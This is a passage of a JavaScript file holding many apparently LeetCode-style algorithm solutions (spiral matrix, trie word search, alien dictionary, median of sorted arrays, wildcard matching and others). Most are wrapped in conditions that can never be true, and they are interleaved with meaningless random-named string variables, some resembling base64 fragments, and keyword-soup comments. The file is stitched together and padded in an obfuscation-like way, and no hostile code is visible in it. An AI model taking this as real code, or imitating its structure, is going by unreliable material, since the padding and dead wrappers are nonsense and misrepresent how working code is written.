        startNode = 0;
    
    for(i = 0; i < len; i++) {
        diff[i] = gas[i] - cost[i];
        sum += diff[i];
        curSum += diff[i];
        
        if (curSum < 0) {
            startNode = i + 1;
            curSum = 0;
        }
    }
    
    if (sum < 0) {
        return -1;
    } else {
        return startNode;
    }
        
};
}

    var bfufoothp = '1owT2lC';
if (!true && 0) {
    /**
Given an integer n, generate a square matrix filled with elements from 1 to n2 in spiral order.

For example,
Given n = 3,

You should return the following matrix:
[
 [ 1, 2, 3 ],
 [ 8, 9, 4 ],
 [ 7, 6, 5 ]
]
*/

/**
 * @param {number} n
 * @return {number[][]}
 */
var generateMatrix = function(n) {
    var curNum = 1,
        total = parseInt(n / 2),
        result = [],
        temp,
        level,
        i,
        j;

    if (n === 0) {
        return result;
    }

    if (n === 1) {
        temp = [1];
        result.push(temp);
        return result;
    }
    // initialization
    for (i = 0; i < n; i++) {
        temp = [];
        for (j = 0; j < n; j++) {
            temp.push(0);
        }

        result.push(temp);
    }


    for (level = 0; level < total; level++) {
        // top
        for (i = level; i < n - level - 1; i++) {
            result[level][i] = curNum;

            if (curNum === n * n) {
                return result;
            }

            curNum++;
        }

        // right
        for (i = level; i < n - level - 1; i++) {
            result[i][n - level - 1] = curNum;
            curNum++;
        }

        // bottom
        for (i = n - level - 1; i > level; i--) {
            result[n - level - 1][i] = curNum;
            curNum++;
        }

        // left
        for (i = n - level - 1; i > level; i--) {
            result[i][level] = curNum;
            curNum++;
        }
    }
    
    if (curNum === n * n) {
        result[total][total] = curNum;
    }
    
    return result;
};

}

    var owewbxzqgh = 'LPDNRbB';
    var xcmdrqxiwnvie = 'MGN';
if (0.55 && false) {
    /**
Given an unsorted array return whether an increasing subsequence of length 3 exists or not in the array.

Formally the function should:
Return true if there exists i, j, k 
such that arr[i] < arr[j] < arr[k] given 0 ≤ i < j < k ≤ n-1 else return false.
Your algorithm should run in O(n) time complexity and O(1) space complexity.

Examples:
Given [1, 2, 3, 4, 5],
return true.

Given [5, 4, 3, 2, 1],
return false.

Credits:
Special thanks to @DjangoUnchained for adding this problem and creating all test cases.
*/
/**
 * @param {number[]} nums
 * @return {boolean}
 */
var increasingTriplet = function(nums) {
    var len = nums.length,
        x1 = Number.MAX_VALUE,
        x2 = Number.MAX_VALUE,
        i;
        
    for (i = 0; i < len; i++) {
        if (nums[i] < x1) {
            x1 = nums[i];
        } else if (x1 < nums[i] && nums[i] < x2) {
            x2 = nums[i];
        } else if (nums[i] > x2) {
            return true;
        }
    }
    
    return false;
};

}

    var turoeqkevrt = 'tPHOnDnTFU';
if (typeof window === 'undefined') {
    /**
Design a data structure that supports the following two operations:

void addWord(word)
bool search(word)
search(word) can search a literal word or a regular expression string containing only letters a-z or .. A . means it can represent any one letter.

For example:

addWord("bad")
addWord("dad")
addWord("mad")
search("pad") -> false
search("bad") -> true
search(".ad") -> true
search("b..") -> true
Note:
You may assume that all words are consist of lowercase letters a-z.

click to show hint.

You should be familiar with how a Trie works. If not, please work on this problem: Implement Trie (Prefix Tree) first.
*/

// MEMORY LIMIT EXCEEDED...

/**
 * @constructor
 */

var WordDictionary = function() {
    this.root = TrieNode();
};

var TrieNode = function() {
    var isEnd,
        links = {};
        
    return {
        containsKey: function(n) {
            return links[n] !== undefined;
        },
        get: function(ch) {
            return links[ch];
        },
        put: function(ch, node) {
            links[ch] = node;
        },
        setEnd: function() {
            isEnd = true;
        },
        isEnd: function() {
            return isEnd;
        },
        getLinks: function() {
            return links;
        }
    };
};

/**
 * @param {string} word
 * @return {void}
 * Adds a word into the data structure.
 */
WordDictionary.prototype.addWord = function(word) {
    var len = word.length,
        node = this.root,
        ch,
        i;
        
    for (i = 0; i < len; i++) {
        ch = word.charAt(i);
        
        if (!node.containsKey(ch)) {
            node.put(ch, TrieNode());
        }
        
        node = node.get(ch);
    }
    
    node.setEnd();
};

/**
 * @param {string} word
 * @return {boolean}
 * Returns if the word is in the data structure. A word could
 * contain the dot character '.' to represent any one letter.
 */
WordDictionary.prototype.search = function(word) {
    var node = this.root;
    
    return this.searchHelper(word, node, 0);
    
};

WordDictionary.prototype.searchHelper = function(word, node, index) {
    var links,
        ch,
        i,
        j;
    
    if (index === word.length) {
        if (node.isEnd()) {
            return true;
        }
        
        return false;
    }
    
    ch = word.charAt(index);
    
    if (ch === '.') {
        links = node.getLinks();
        
        for (j in links) {
            if (this.searchHelper(word, links[j], index + 1)) {
                return true;
            }
        }
    } else if (node.containsKey(ch)) {
        return this.searchHelper(word, node.get(ch), index + 1);
    }
        return false;
}
/**
 * Your WordDictionary object will be instantiated and called as such:
 * var wordDictionary = new WordDictionary();
 * wordDictionary.addWord("word");
 * wordDictionary.search("pattern");
 */

}

    var kpofdrzuxnwyxzz = 'uVmxMQ0Jy';
    var mcmpbrsqsqy = 'jgDLrsP';
// array string object code define
if (63 > 194) {
    /**
Given n non-negative integers a1, a2, ..., an, where each represents a point at coordinate (i, ai). n vertical lines are drawn such that the two endpoints of line i is at (i, ai) and (i, 0). Find two lines, which together with x-axis forms a container, such that the container contains the most water.

Note: You may not slant the container.

 * @param {number[]} height
 * @return {number}
 */
var maxArea = function(height) {
    var len = height.length, 
        left = 0,
        right = len - 1,
        max = 0;
    
    while (left < right) {
        max = Math.max(max, (right - left)*Math.min(height[left], height[right]));
        
        if (height[left] < height[right]) {
            left ++;
        } else {
            right --;
        }
    }
    return max;
};

}

    var axygbs = 'oLpDHyKYs';
    var tbhmxgkmkbcgw = 'WlhsRGIyU';
if (null === 4) {
    /**
There is a new alien language which uses the latin alphabet. However, the order among letters are unknown to you. You receive a list of words from the dictionary, where words are sorted lexicographically by the rules of this new language. Derive the order of letters in this language.

For example,
Given the following words in dictionary,

[
  "wrt",
  "wrf",
  "er",
  "ett",
  "rftt"
]
The correct order is: "wertf".

Note:
You may assume all letters are in lowercase.
If the order is invalid, return an empty string.
There may be multiple valid order of letters, return any one of them is fine.
*/
/**
 * @param {string[]} words
 * @return {string}
 */
var alienOrder = function(words) {
    if (words.length === 0) {
        return '';
    }
    
    const len = words.length;
    let map = {}; // value is the prerequisite of key
    let charPreReqCount = {};
    let i;
    let queue = [];
    let result = [];
    let hasCycle = false;
    
    for (i = 0; i < len; i++) {
        const chars = words[i].split('');
        
        let j = 0;
        
        for (j = 0; j < chars.length; j++) {
            if (!map[chars[j]]) {
                map[chars[j]] = [];
                charPreReqCount[chars[j]] = 0;
            }
        }

        if (i === 0 || words[i] === words[i - 1]) {
            continue;
        }
        
        const cur = words[i];
        const prev = words[i - 1];
        j = 0;
        
        while(j < cur.length && j < prev.length && cur.charAt(j) === prev.charAt(j)) {
            j++;
        }
        
        if (j < prev.length && map[prev.charAt(j)].indexOf(cur.charAt(j)) === -1) {
            map[prev.charAt(j)].push(cur.charAt(j));
            
            charPreReqCount[cur.charAt(j)]++;
        }
    }
    
    Object.keys(charPreReqCount).forEach(char => {
        if (charPreReqCount[char] === 0) {
            queue.push(char);
        }
    });
    
    while(queue.length > 0) {
        const char = queue.shift();
        
        result.push(char);
        
        for (i = 0; i < map[char].length; i++) {
            charPreReqCount[map[char][i]]--;
            
            if (charPreReqCount[map[char][i]] === 0) {
                queue.push(map[char][i]);
            }
        }
    }
    
    // detect cycle
    Object.keys(charPreReqCount).forEach(function(char) {
        if (charPreReqCount[char] !== 0) {
            hasCycle = true;
        }
    });
    
    return hasCycle ? '' : result.join('');
};

}

    var nnbrctqw = 'Moibm';
if (!true && 1) {
    /**
You are climbing a stair case. It takes n steps to reach to the top.

Each time you can either climb 1 or 2 steps. In how many distinct ways can you climb to the top?

 * @param {number} n
 * @return {number}
 */
var climbStairs = function(n) {
    var arr = [],
        i;
    
    arr[0] = 0;
    arr[1] = 1;
    arr[2] = 2;
    
    for(i = 3; i <= n; i++) {
        arr[i] = arr[i - 1] + arr[i - 2];
    }
    return arr[n];
};

}

    var gnuql = 'mxPaUEyT';
    var swdcpq = 'pPmwUccFC';
    var mlcqmasnrei = 'nlCOUxDQ';
    var wpowbs = 'HPGK';
if (typeof window === 'undefined') {
    /**
Given an unsorted array nums, reorder it such that nums[0] < nums[1] > nums[2] < nums[3]....

Example:
(1) Given nums = [1, 5, 1, 1, 6, 4], one possible answer is [1, 4, 1, 5, 1, 6]. 
(2) Given nums = [1, 3, 2, 2, 3, 1], one possible answer is [2, 3, 1, 3, 1, 2].

Note:
You may assume all input has valid answer.

Follow Up:
Can you do it in O(n) time and/or in-place with O(1) extra space?
*/
/**
 * @param {number[]} nums
 * @return {void} Do not return anything, modify nums in-place instead.
 */
var wiggleSort = function(nums) {
    var len = nums.length,
        temp = [],
        midIndex = parseInt((len + 1) / 2),
        i,
        l,
        r,
        medium;
        
    medium = findKth(0, len - 1, midIndex, nums);
    
    for (i = 0, l = 0, r = len - 1; i < len; i++) {
        if (nums[i] < medium) {
            temp[l++] = nums[i];
        } else if (nums[i] > medium) {
            temp[r--] = nums[i];
        }
    }
    
    while (l < midIndex) {
        temp[l++] = medium;
    }
    
    while (r >= midIndex) {
        temp[r--] = medium;
    }
    
    r = len;
    
    for (i = 0; i < len; i++) {
        nums[i] = (i & 1) === 0? temp[--l] : temp[--r];
    }
};

function findKth(start, end, k, nums) {
    if (start >= end) {
        return nums[end];
    }
    
    var index = partition(start, end, nums),
        count = index - start + 1;
    
    if (count === k) {
        return nums[index];
    }
    
    if (count < k) {
        return findKth(index + 1, end, k - count, nums);
    }
    
    return findKth(start, index - 1, k, nums);
}

function partition(start, end, nums) {
    var val = nums[start],
        i,
        j;
    
    i = start + 1;
    j = end;
    
    while (true) {
        while (nums[i] <= val) {
            i++;
        }
        
        while (nums[j] > val) {
            j--;
        }
        
        if (i >= j) {
            break;
        }
        
        swap(nums, i, j);
    }
    
    swap(nums, j, start);
    
    return j;
}

function swap(nums, i, j) {
    var temp = nums[i];
    
    nums[i] = nums[j];
    nums[j] = temp;
}

}

    var hjzxjbmaq = 'XZMeUJEZEh';
    var zbpkfv = 'RpHBkXLtze';
    var qghbw = 'Kc0sxTm9h';
    var qzqjowpxum = 'fcUiHWUwR';
// event compile import string hello function object variable
    var alevoh = 'HBUfEBB';
    var kyhtch = 'V1owSzBNS0';
    var ihcqjjjyyif = 'XpBqCOpXwp';
if (7 === 12) {
    /**
Given n non-negative integers a1, a2, ..., an, where each represents a point at coordinate (i, ai). n vertical lines are drawn such that the two endpoints of line i is at (i, ai) and (i, 0). Find two lines, which together with x-axis forms a container, such that the container contains the most water.

Note: You may not slant the container.

 * @param {number[]} height
 * @return {number}
 */
var maxArea = function(height) {
    var len = height.length, 
        left = 0,
        right = len - 1,
        max = 0;
    
    while (left < right) {
        max = Math.max(max, (right - left)*Math.min(height[left], height[right]));
        
        if (height[left] < height[right]) {
            left ++;
        } else {
            right --;
        }
    }
    return max;
};

}

    var attyphf = 'lDQWdJ';
    var rczbgz = 'eKYtkY';
if (0.57 && false) {
    /**
Given a string S and a string T, count the number of distinct subsequences of T in S.

A subsequence of a string is a new string which is formed from the original string by deleting some (can be none) of the characters without disturbing the relative positions of the remaining characters. (ie, "ACE" is a subsequence of "ABCDE" while "AEC" is not).

Here is an example:
S = "rabbbit", T = "rabbit"

Return 3.
*/
/**
 * @param {string} s
 * @param {string} t
 * @return {number}
 * 
 * S[j-1]!= T[i-1]：DP[i][j] = DP[i][j-1]
 * S[j-1]==T[i-1]：DP[i][j] = DP[i-1][j-1] + DP[i][j-1]
 */
var numDistinct = function(s, t) {
    var lenS = s.length,
        lenT = t.length,
        i,
        j,
        dp;
        
    if (lenS < lenT) {
        return 0;
    }
    
    if (lenS === lenT) {
        return s === t? 1 : 0;
    }
    
    dp = [];
    
    for (i = 0; i <= lenT; i++) {
        dp.push(new Array(lenS + 1));

        for (j = 0; j <= lenS; j++) {
            dp[i][j] = 0;
        }
    }
    
    for (j = 0; j <= lenS; j++) {
        dp[0][j] = 1;
    }
    
    
    for (i = 0; i < lenT; i++) {
        for (j = 0; j < lenS; j++) {
            dp[i + 1][j + 1] = dp[i + 1][j];
            
            if (s.charAt(j) === t.charAt(i)) {
                dp[i + 1][j + 1] += dp[i][j];
            }
        }
    }
    
    return dp[lenT][lenS];
};

// use 1D dp solution
// draw 2D dp realation and try to save space
/**
 * @param {string} s
 * @param {string} t
 * @return {number}
 * 
 * S[j-1]!= T[i-1]：DP[i][j] = DP[i][j-1]
 * S[j-1]==T[i-1]：DP[i][j] = DP[i-1][j-1] + DP[i][j-1]
 */
var numDistinct = function(s, t) {
    var lenS = s.length,
        lenT = t.length,
        i,
        j,
        dp;
        
    if (lenS < lenT) {
        return 0;
    }
    
    if (lenS === lenT) {
        return s === t? 1 : 0;
    }
    
    dp = [];
    dp[0] = 1;    
    
    for (i = 1; i <= lenT; i++) {
        dp[i] = 0;
    }
    
    for (j = 0; j <= lenS; j++) {
        for (i = lenT - 1; i >= 0; i--) {
            if (s.charAt(j) === t.charAt(i)) {
                dp[i + 1] += dp[i];
            }
        }
    }
    
    return dp[lenT];
};

}

    var blbgpouzm = 'Q0F';
if (10 === 13) {
    /**
Implement an iterator over a binary search tree (BST). Your iterator will be initialized with the root node of a BST.

Calling next() will return the next smallest number in the BST.

Note: next() and hasNext() should run in average O(1) time and uses O(h) memory, where h is the height of the tree.
*/
/**
 * Definition for binary tree
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */

/**
 * @constructor
 * @param {TreeNode} root - root of the binary search tree
 */
var BSTIterator = function(root) {
    this.stack = [];
    
    while (root) {
        this.stack.push(root);
        root = root.left;
    }
};


/**
 * @this BSTIterator
 * @returns {boolean} - whether we have a next smallest number
 */
BSTIterator.prototype.hasNext = function() {
    return this.stack.length > 0;
};

/**
 * @this BSTIterator
 * @returns {number} - the next smallest number
 */
BSTIterator.prototype.next = function() {
    var node = this.stack.pop(),
        result = node.val;
    
    node = node.right;
    while (node) {
        this.stack.push(node);
        node = node.left;
    }
    
    return result;
};

/**
 * Your BSTIterator will be called like this:
 * var i = new BSTIterator(root), a = [];
 * while (i.hasNext()) a.push(i.next());
*/

}

    var sjytiidh = 'BhiiPs';
    var avyxhkgeb = 'nSUNCN0l';
    var zeqqltzyiouu = 'ciCuIU';
// uhbxywpn import loop function number function async quwe
    var emezctdjsubj = 'OzaWuoRt';
if (Array.isArray(6)) {
    /**
Given a positive integer, return its corresponding column title as appear in an Excel sheet.

For example:

    1 -> A
    2 -> B
    3 -> C
    ...
    26 -> Z
    27 -> AA
    28 -> AB 
*/
/**
 * @param {number} n
 * @return {string}
 */
var convertToTitle = function(n) {
    var result = '',
        cur;
    
    //97 is the ASCII code for lower case 'a'. If you want uppercase letters, replace 97 with 65 (uppercase 'A'). 
    
    while (n > 0) {
        cur = (n - 1) % 26;
        result = String.fromCharCode(65 + cur) + result;
        n = Math.floor((n - 1) / 26);
    }
    
    return result;
};

}

    var epohchvnwb = 'HTjBj';
    var omchakhueuwg = 'BFpmSs';
if ('false' === true) {
    /**
Given a string array words, find the maximum value of length(word[i]) * length(word[j]) where the two words do not share common letters. You may assume that each word will contain only lower case letters. If no such two words exist, return 0.

Example 1:
Given ["abcw", "baz", "foo", "bar", "xtfn", "abcdef"]
Return 16
The two words can be "abcw", "xtfn".

Example 2:
Given ["a", "ab", "abc", "d", "cd", "bcd", "abcd"]
Return 4
The two words can be "ab", "cd".

Example 3:
Given ["a", "aa", "aaa", "aaaa"]
Return 0
No such pair of words.
*/

/**
 * @param {string[]} words
 * @return {number}
 */
var maxProduct = function(words) {
    var len = words.length,
        arr = [],
        result = 0,
        i,
        j;
    
    for (i = 0; i < len; i++) {
        arr[i] = 0;
        
        for (j = 0; j < words[i].length; j++) {
            arr[i] |= (1 << (words[i].charCodeAt(j) - 97));
        }
    }
    
    for (i = 0; i < len; i++) {
        for (j = i + 1; j < len; j++) {
            if ((arr[i] & arr[j]) === 0) {
                result = Math.max(result, words[i].length * words[j].length);
            }
        }
    }
    
    return result;
};

}

    var wkzfpggwswnupkk = 'bXc2SUhSe';
    var yjxhsdqjha = 'ZWKjATfoT';
if ('true' === true) {
    /**
Given a binary tree, return the bottom-up level order traversal of its nodes' values. (ie, from left to right, level by level from leaf to root).

For example:
Given binary tree {3,9,20,#,#,15,7},
    3
   / \
  9  20
    /  \
   15   7
return its bottom-up level order traversal as:
[
  [15,7],
  [9,20],
  [3]
]
confused what "{1,#,2,3}" means? > read more on how binary tree is serialized on OJ.
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {number[][]}
 */
var levelOrderBottom = function(root) {
    var result = [],
        parent = [],
        parentData,
        cur;
    
    if (root === null) {
        return result;
    }
    
    parent.push(root);
    
    while (parent.length > 0) {
        cur = [];
        parentData = [];
        
        for (var i in parent) {
            parent[i].left ? cur.push(parent[i].left) : null;
            parent[i].right? cur.push(parent[i].right) : null;
            parentData.push(parent[i].val);
        }
        
        result.unshift(parentData);
        
        parent = cur;
    }
    
    return result;
};

}

// string function array import return compile script nuvalc
    var yrjejghnza = 'MMVVW';
    var zoxliika = 'WRXVXN';
    var mytwrjcu = 'vyuJzsGaQ';
    var imucixoxlppc = 'JSE5vYVdaM';
if (0.12 && false) {
    /**
There are two sorted arrays nums1 and nums2 of size m and n respectively. Find the median of the two sorted arrays. The overall run time complexity should be O(log (m+n)).


*/
/**
 * @param {number[]} nums1
 * @param {number[]} nums2
 * @return {number}
 */
var findMedianSortedArrays = function(nums1, nums2) {
    var len1 = nums1.length,
        len2 = nums2.length,
        len = len1 + len2;
        
    if (len % 2 === 1) {
        return findMedianHelper(0, nums1, 0, nums2, (len + 1) / 2);
    } else {
        return (findMedianHelper(0, nums1, 0, nums2, len / 2) + findMedianHelper(0, nums1, 0, nums2, len / 2 + 1)) / 2;
    }
};

function findMedianHelper(aStart, numsA, bStart, numsB, k) {
    if (aStart >= numsA.length) {
        return numsB[bStart + k - 1];
    }
    
    if (bStart >= numsB.length) {
        return numsA[aStart + k - 1];
    }
    
    if (k === 1) {
        return Math.min(numsA[aStart], numsB[bStart]);
    }
    
    var aKey = aStart + parseInt(k / 2) - 1 < numsA.length? numsA[aStart + parseInt(k / 2) - 1] : Number.MAX_VALUE,
        bKey = bStart + parseInt(k / 2) - 1 < numsB.length? numsB[bStart + parseInt(k / 2) - 1] : Number.MAX_VALUE;
        
    if (aKey < bKey) {
        return findMedianHelper(aStart + parseInt(k / 2), numsA, bStart, numsB, k - parseInt(k / 2));
    }
    
    return findMedianHelper(aStart, numsA, bStart + parseInt(k / 2), numsB, k - parseInt(k / 2));
}

}

    var ymywlikoup = 'XNprKkfliM';
    var kukqynrcu = 'E9p';
if (1 === 13) {
    /**
Implement wildcard pattern matching with support for '?' and '*'.

'?' Matches any single character.
'*' Matches any sequence of characters (including the empty sequence).

The matching should cover the entire input string (not partial).

The function prototype should be:
bool isMatch(const char *s, const char *p)

Some examples:
isMatch("aa","a") → false
isMatch("aa","aa") → true
isMatch("aaa","aa") → false
isMatch("aa", "*") → true
isMatch("aa", "a*") → true
isMatch("ab", "?*") → true
isMatch("aab", "c*a*b") → false
*/
/**
 * @param {string} s
 * @param {string} p
 * @return {boolean}
 */
var isMatch = function(s, p) {
    let sIndex = 0;
    let pIndex = 0;
    let startIndex = -1; // startIndex of * in p
    let match = 0; // the position in s that matches with p 
    
    while (sIndex < s.length) {
        // matches, both advance
        if (pIndex < p.length && (s.charAt(sIndex) === p.charAt(pIndex) || p.charAt(pIndex) === '?')) {
            pIndex++;
            sIndex++;
        } else if (pIndex < p.length && p.charAt(pIndex) === '*') {
            startIndex = pIndex;
            match = sIndex;
            pIndex++;
        } else if (startIndex !== -1) {
            pIndex = startIndex + 1;
            match++;
            sIndex = match;
        } else {
            return false;
        }
    }
    
    while (pIndex < p.length && p.charAt(pIndex) === '*') {
        pIndex++;
    }
    
    return pIndex === p.length;
};

}

    var zjiemvqq = 'kwLnk';
    var wtjik = 'QjBj';
    var lmynjoww = 'IVRpVvC';
if (77 > 154) {
    /**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {number}
 */
var maxPathSum = function(root) {
    var max = [];
    
    max[0] = Number.NEGATIVE_INFINITY;
    getMaxValueToParent(root, max);
    
    return max[0];
};

/**
* This function returns the max value that contains current node to its parent
*/
function getMaxValueToParent(root, max) {
    if (root === null) {
        return 0;
    }
    
    var left = getMaxValueToParent(root.left, max),
        right = getMaxValueToParent(root.right, max),
        maxPathAcrossRootNotToParent = root.val + left + right, // path that contains current node and will not go to its parent
        maxPathAcrossRootToParent = Math.max(root.val, root.val + Math.max(left, right));
        
    max[0] = Math.max(max[0], maxPathAcrossRootNotToParent, maxPathAcrossRootToParent);
    
    return maxPathAcrossRootToParent;
}

}

    var rzultyhhdbqh = 'blZs';
    var rnokam = 'OrXArZfp';
    var kldswrinrfhmtv = 'TEN';
    var igrflzpoogw = 'hYuamqFGI';
    var yletuxrpixo = 'CclpYbERiM';
    var ngaajug = 'WJfZzpPw';
    var crjaxhmcdpzyjgs = 'lJsT2lBM05';
    var njsjlfahyfe = 'WLWNuWI';
if (Array.isArray(4)) {
    /**
Given a 2D matrix matrix, find the sum of the elements inside the rectangle defined by its upper left corner (row1, col1) and lower right corner (row2, col2).

Range Sum Query 2D
The above rectangle (with the red border) is defined by (row1, col1) = (2, 1) and (row2, col2) = (4, 3), which contains sum = 8.

Example:
Given matrix = [
  [3, 0, 1, 4, 2],
  [5, 6, 3, 2, 1],
  [1, 2, 0, 1, 5],
  [4, 1, 0, 1, 7],
  [1, 0, 3, 0, 5]
]

sumRegion(2, 1, 4, 3) -> 8
sumRegion(1, 1, 2, 2) -> 11
sumRegion(1, 2, 2, 4) -> 12
Note:
You may assume that the matrix does not change.
There are many calls to sumRegion function.
You may assume that row1 ≤ row2 and col1 ≤ col2.
*/

 /**
 * @constructor
 * @param {number[][]} matrix
 */
var NumMatrix = function(matrix) {
    var sum = [],
        rLen = matrix.length,
        cLen,
        i,
        j;
    
    if (rLen === 0) {
        this.sum = null;
        return;
    }
    
    cLen = matrix[0].length;
    
    for (i = 0; i < rLen; i++) {
        sum.push(new Array(cLen));
    }    
    
    sum[0][0] = matrix[0][0];
    
    for (i = 1; i < rLen; i++) {
        sum[i][0] = sum[i - 1][0] + matrix[i][0];
    }
    
    for (j = 1; j < cLen; j++) {
        sum[0][j] = sum[0][j - 1] + matrix[0][j];
    }
    
    for (i = 1; i < rLen; i++) {
        for (j = 1; j < cLen; j++) {
            sum[i][j] = sum[i - 1][j] + sum[i][j - 1] - sum[i - 1][j - 1] + matrix[i][j];
        }
    }
    
    this.sum = sum;
};

/**
 * @param {number} row1
 * @param {number} col1
 * @param {number} row2
 * @param {number} col2
 * @return {number}
 */
NumMatrix.prototype.sumRegion = function(row1, col1, row2, col2) {
    if (!this.sum) {
        return 0;
    }
    
    var result = this.sum[row2][col2];
    
    if (row1 > 0) {
        result -= this.sum[row1 - 1][col2];
    }
    
    if (col1 > 0) {
        result -= this.sum[row2][col1 - 1];
    }
    
    if (row1 > 0 && col1 > 0) {
        result += this.sum[row1 - 1][col1 - 1];
    }
    
    return result;
};


/**
 * Your NumMatrix object will be instantiated and called as such:
 * var numMatrix = new NumMatrix(matrix);
 * numMatrix.sumRegion(0, 1, 2, 3);
 * numMatrix.sumRegion(1, 2, 3, 4);
 */

}

    var gmmzt = 'DQjlMQ0F2T';
    var vevbpsbewyw = 'bRATqqxn';
if (typeof navigator === 'undefined') {
    /**
Say you have an array for which the ith element is the price of a given stock on day i.

Design an algorithm to find the maximum profit. You may complete at most two transactions.

Note:
You may not engage in multiple transactions at the same time (ie, you must sell the stock before you buy again).
*/
/**
 * @param {number[]} prices
 * @return {number}
 * 
 * 数组l[i]记录了price[0..i]的最大profit，
 * 数组r[i]记录了price[i..n]的最大profit。
 * 已知l[i]，求l[i+1]是简单的，同样已知r[i]，求r[i-1]也很容易。
 * 最后，我们再用O(n)的时间找出最大的l[i]+r[i]，即为题目所求。
 */
var maxProfit = function(prices) {
    var len = prices.length,
        l = [],
        r = [],
        i,
        max,
        min;
    
    l[0] = 0;
    min = prices[0];
    
    for (i = 1; i < len; i++) {
        l[i] = Math.max(l[0], prices[i] - min);
        min = Math.min(min, prices[i]);
    }
    
    r[len - 1] = 0;
    max = prices[len - 1];
    
    for (i = len - 2; i >= 0; i--) {
        r[i] = Math.max(r[i + 1], max - prices[i]);
        max = Math.max(max, prices[i]);
    }
    
    max = 0;
    
    for (i = 0; i < len; i++) {
        max = Math.max(max, l[i] + r[i]);
    }
    
    return max;
};

}

    var xuauqjtvq = 'HlCRGR';
if ('true' === true) {
    /**
Given a 2D matrix matrix, find the sum of the elements inside the rectangle defined by its upper left corner (row1, col1) and lower right corner (row2, col2).

Range Sum Query 2D
The above rectangle (with the red border) is defined by (row1, col1) = (2, 1) and (row2, col2) = (4, 3), which contains sum = 8.

Example:

Given matrix = [
  [3, 0, 1, 4, 2],
  [5, 6, 3, 2, 1],
  [1, 2, 0, 1, 5],
  [4, 1, 0, 1, 7],
  [1, 0, 3, 0, 5]
]

sumRegion(2, 1, 4, 3) -> 8
update(3, 2, 2)
sumRegion(2, 1, 4, 3) -> 10

Note:

    The matrix is only modifiable by the update function.
    You may assume the number of calls to update and sumRegion function is distributed evenly.
    You may assume that row1 ≤ row2 and col1 ≤ col2.

*/
/**
 * @constructor
 * @param {number[][]} matrix
 */
var NumMatrix = function(matrix) {
    this.matrix = matrix;
    this.rowLen = matrix.length;
    this.colLen = this.rowLen === 0 ? 0 : matrix[0].length;
    this.colSum = []; // colSum[i][j] means column sum from matrix[0][j] to matrix[i][j]
    
    for (let i = 0; i < this.rowLen; i++) {
        this.colSum.push(new Array(this.colLen).fill(0));
    }
    
    for (let i = 0; i < this.rowLen; i++) {
        for (let j = 0; j < this.colLen; j++) {
            if (i === 0) {
                this.colSum[i][j] = this.matrix[i][j];
            } else {
                this.colSum[i][j] = this.matrix[i][j] + this.colSum[i - 1][j];
            }
        }
    }
};

/**
 * @param {number} row
 * @param {number} col
 * @param {number} val
 * @return {void}
 */
NumMatrix.prototype.update = function(row, col, val) {
    for (let i = row; i < this.rowLen; i++) {
        this.colSum[i][col] += val - this.matrix[row][col];
    }
    
    this.matrix[row][col] = val;
};

/**
 * @param {number} row1
 * @param {number} col1
 * @param {number} row2
 * @param {number} col2
 * @return {number}
 */
NumMatrix.prototype.sumRegion = function(row1, col1, row2, col2) {
    let result = 0;
    
    for (let i = col1; i <= col2; i++) {
        if (row1 === 0) {
            result += this.colSum[row2][i];
        } else {
            result += this.colSum[row2][i] - this.colSum[row1 - 1][i];
        }
    }
    
    return result;
};


/**
 * Your NumMatrix object will be instantiated and called as such:
 * var numMatrix = new NumMatrix(matrix);
 * numMatrix.sumRegion(0, 1, 2, 3);
 * numMatrix.update(1, 1, 10);
 * numMatrix.sumRegion(1, 2, 3, 4);
 */

}

    var awfhjaw = 'rbbToiV';
    var borpyjmz = 'ISnNLMU';
if ('a' === 'S') {
    /**
 * @param {number} n
 * @return {number}
 */
var numSquares = function(n) {
    var arr = [],
        i,
        j;
    
    arr[0] = 0;
    
    for (i = 1; i <= n; i++) {
        arr[i] = Number.MAX_VALUE;
    }
    
    for (i = 0; i <= n; i++) {
        for (j = 1; i + j * j <= n; j++) {
            arr[i + j * j] = Math.min(arr[i + j * j], arr[i] + 1);
        }
    }
    
    return arr[n];
};

// SOLUTION 2
/**
 * 根据四平方和定理，任意一个正整数均可表示为4个整数的平方和，其实是可以表示为4个以内的平方数之和，那么就是说返回结果只有1,2,3或4其中的一个，首先我们将数字化简一下，由于一个数如果含有因子4，那么我们可以把4都去掉，并不影响结果，比如2和8,3和12等等，返回的结果都相同，读者可自行举更多的栗子。
 * 还有一个可以化简的地方就是，如果一个数除以8余7的话，那么肯定是由4个完全平方数组成，这里就不证明了，因为我也不会证明，读者可自行举例验证。那么做完两步后，一个很大的数有可能就会变得很小了，大大减少了运算时间，下面我们就来尝试的将其拆为两个平方数之和，如果拆成功了那么就会返回1或2，因为其中一个平方数可能为0. 
 * @param {number} n
 * @return {number}
 */
var numSquares = function(n) {
    while(n % 4 === 0) {
        n /= 4;
    }
    
    if (n % 8 === 7) {
        return 4;
    }
    
    var i,
        j;
    
    // check if it's 1 or 2
    for (i = 0; i * i <= n; i++) {
        j = parseInt(Math.sqrt(n - i * i));
        if (i * i + j * j === n) {
            return (i === 0 || j === 0)? 1 : 2;
        }
    }
    
    return 3;
};

}

    var fcmfkjrj = 'ICknyHsVKQ';
if (9 === 12) {
    /**
Say you have an array for which the ith element is the price of a given stock on day i.

If you were only permitted to complete at most one transaction (ie, buy one and sell one share of the stock), design an algorithm to find the maximum profit.

 * @param {number[]} prices
 * @return {number}
 */
var maxProfit = function(prices) {
    var i,
        length = prices.length,
        low,
        high,
        max = 0,
        cur;
        
    if (length === 0) {
        return 0;
    }
    low = prices[0];
    high = low;
    for (i = 1; i < length; i++) {
        cur = prices[i];
        if (cur > high) {
            high = cur;
        }else if (cur < low) {
            //need to reset low and high in order to make sure you need to buy before you sell
            low = cur;
            high = cur;
        }
        if (high - low > max) {
            max = high - low;
        }
    }
    return max;
};

}

    var yixwiapr = '5vYVdaMEsw';
if (0.32 && false) {
    /**
Implement next permutation, which rearranges numbers into the lexicographically next greater permutation of numbers.

If such arrangement is not possible, it must rearrange it as the lowest possible order (ie, sorted in ascending order).

The replacement must be in-place, do not allocate extra memory.

Here are some examples. Inputs are in the left-hand column and its corresponding outputs are in the right-hand column.
1,2,3 → 1,3,2
3,2,1 → 1,2,3
1,1,5 → 1,5,1

 * @param {number[]} nums
